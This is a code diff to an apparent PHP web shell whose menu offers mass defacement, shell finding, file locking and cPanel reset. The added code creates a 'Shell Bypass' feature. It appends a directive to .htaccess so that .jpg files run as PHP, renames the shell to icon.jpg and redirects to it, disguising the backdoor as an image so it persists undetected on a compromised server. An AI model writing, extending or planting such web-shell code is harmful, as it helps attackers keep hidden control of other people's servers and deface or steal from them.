@@ -744,6 +744,7 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("massdef").'=opet">Mass Deface</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("scanshell").'=opet">Shell Finder</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("lokfile").'=opet">Lock File</button>
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("shell-bypass").'=opet">Shell Bypass</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
         exit();
 } elseif ($_GET[net('cmd')] == "opet") {
@@ -823,7 +824,23 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
 } elseif ($_GET[net('resetcp')] == "opet") {
 echo "<table class='directory-listing-table'><td>
 <h5>Coming Soon</h5><hr></td></table><br>";exit();
-} elseif ($_GET[net('hashiden')] == "opet") {
+
+}elseif ($_GET[net('shell-bypass')]=='opet') {
+    $isi="\n Addhandler application/x-httpd-php .jpg";
+
+    $fp=fopen('.htaccess','a+');
+    if(fwrite($fp,$isi)){
+        if(rename($_SERVER['SCRIPT_FILENAME'],"icon.jpg")){
+            echo"
+            <script>
+            alert('Success !!');
+            window.location.href='icon.jpg'
+            </script>";
+        }
+    }
+    fclose($fp);
+}
+ elseif ($_GET[net('hashiden')] == "opet") {
  echo "<table class='directory-listing-table'><td>
 <h5>Hash Identifier</h5>Identify and detect unknown hashes using this tool.<hr>
 <form method='POST'>
